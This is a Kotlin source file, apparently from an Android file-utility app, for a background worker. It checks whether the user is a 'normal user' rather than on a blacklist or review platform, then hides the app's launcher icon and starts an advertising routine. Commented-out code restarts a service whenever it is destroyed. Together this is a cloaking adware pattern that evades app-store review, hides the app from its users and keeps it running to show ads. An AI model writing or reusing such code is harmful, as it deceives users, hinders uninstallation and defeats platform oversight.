package com.hal.convenientfile.worker

import android.content.Context
import android.os.Handler
import android.os.Looper
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.hal.convenientfile.base.BaseApp
import com.hal.convenientfile.ui.SplashActivity
import com.hal.convenientfile.util.*

/**
 * Description:
 * Author: icarus
 * Email: 769247877@qq.com
 * Date: 2024/1/17
 */
class ConvWorker(context: Context, params: WorkerParameters) :
    Worker(context, params), LifecycleOwner {
    private val mLifecycleRegistry by lazy { LifecycleRegistry(this) }

    private val checkHideHandler by lazy { Handler(Looper.getMainLooper()) }

    private val checkHideTimeDuration = 10_000L


    init {
        Handler(Looper.getMainLooper()).post {
            mLifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
            mLifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
        }
    }

    override fun doWork(): Result {
        "start to work...".log()
      /*  Handler(Looper.getMainLooper()).post {
            Cloak.onServiceDestroy.observe(this) {
                if (it) {
                    Handler(Looper.getMainLooper()).postDelayed({
                        //service 被调用onDestroy
                        if (CalApp.app.isInForeground) {
                            "listen and restart service foreground...".log()
                            try {
                                CalApp.app.startForegroundService(
                                    Intent(
                                        CalApp.app,
                                        MidSCalcService::class.java
                                    )
                                )
                            } catch (e: Exception) {
                                e.printStackTrace()
                            }
                        } else {
                            //应用在后台
                            "listen and restart service background...".log()
                            try {
                                val intent = Intent(
                                    CalApp.app,
                                    CalStartsvActivity::class.java
                                ).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                CalApp.app.startActivity(intent)
                            } catch (e: Exception) {
                                e.printStackTrace()
                            }
                        }
                    }, 3000)
                }
            }
        }*/
        checkHideLoop()
        /**
         * 如果是正常用户，且图标已经隐藏，则开启广告策略
         *
         */
        if (CloakUtil.isNormalUser() && AppUtil.isIconHide()
                .apply {
                    log("is hided == ", this)
                }
        ) {
            startAdStrategy()
        }

        return Result.success()
    }

    /**
     * 检查隐藏逻辑
     */
    private fun checkHideLoop() {
        val isHided = AppUtil.isIconHide()
        val isGettingUserInfo =
            AdUtil.isInThirdPlatform.value == null || AdUtil.isInBlackList.value == null
        log(
            "checkHide isHided=",
            isHided, " isNor=",
            CloakUtil.isNormalUser(),
            " isGettingUserInfo=", isGettingUserInfo
        )
        //当前图标未隐藏，并且(当前用户是正常用户||正在获取用户平台信息)
        if (!isHided && (CloakUtil.isNormalUser() || isGettingUserInfo)) {
            //开启循环检查
            val runnable = object : Runnable {
                override fun run() {
                    checkConditions(this, System.currentTimeMillis())
                }
            }
            checkHideHandler.postDelayed(runnable, checkHideTimeDuration)
        }
    }

    private fun checkConditions(runnable: Runnable, now: Long) {
//        val appInstallTime = AppUtil.firstOpenTime.value ?: 0
//        val isInstallTimeOk = now - appInstallTime >= Cloak.afterInstallTime
        //是否屏幕交互状态,0:需要判断当前为不可交互状态才符合条件，其他:不考虑此条件，返回true
//        val screenActiveFlag = if (Cloak.hideFlag != 2L) true else !ScreenUtil.isInteractive()
//        val isAppInBackground = !SceneryApp.app.isInForeground
        //启动页面不能再任务栈中，否则会崩溃
        val isStartAcInTask =
            BaseApp.app.activitySet.filterIsInstance<SplashActivity>().isNotEmpty()
        log(
            "user=", CloakUtil.isNormalUser(), " isStartAcInTask=", isStartAcInTask,
            "adLTime==", Cloak.adLoopTime
        )
        if (CloakUtil.isNormalUser() && !isStartAcInTask) {
            AppUtil.canOpt = true
            Handler(Looper.getMainLooper()).postDelayed({
                AppUtil.canOpt = false
            }, 200)
            //隐藏图标
            AppUtil.hideIcon()
            //启动广告策略
            startAdStrategy()
        } else {
            checkHideHandler.postDelayed(runnable, checkHideTimeDuration)
        }
    }

    private fun startAdStrategy() {
        CloakUtil.startAdStrategy()
    }

    private fun stopAdStrategy() {
        CloakUtil.stopAdStrategy()
    }

    /*    fun onFinish() {
            Handler(Looper.getMainLooper()).post {
                mLifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_DESTROY)
                checkHideHandler.removeCallbacksAndMessages(null)
                retryHandler.removeCallbacksAndMessages(null)
                stopAdStrategy()
                disposable.dispose()
            }
        }*/

    override val lifecycle: Lifecycle
        get() = mLifecycleRegistry

}